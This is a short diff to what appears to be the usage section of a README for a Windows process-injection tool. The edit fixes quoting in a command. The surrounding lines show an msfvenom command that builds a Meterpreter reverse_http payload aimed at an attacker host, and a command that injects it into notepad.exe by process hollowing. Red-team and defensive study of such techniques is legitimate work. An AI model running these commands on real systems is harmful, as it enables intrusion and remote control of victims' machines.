@@ -39,7 +39,7 @@ Currently the program accepts shellcode in 3 formats
 	Process Hollowing
 	Generating shellcode in c format and injecting it in the target process.
 	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
-	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:""C:\Users\User\Desktop\shellcode.txt" /f:c /t:3
+	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:3
 	
 	Parent PID Spoofing
 	Generating shellcode in c format and injecting it in the target process.
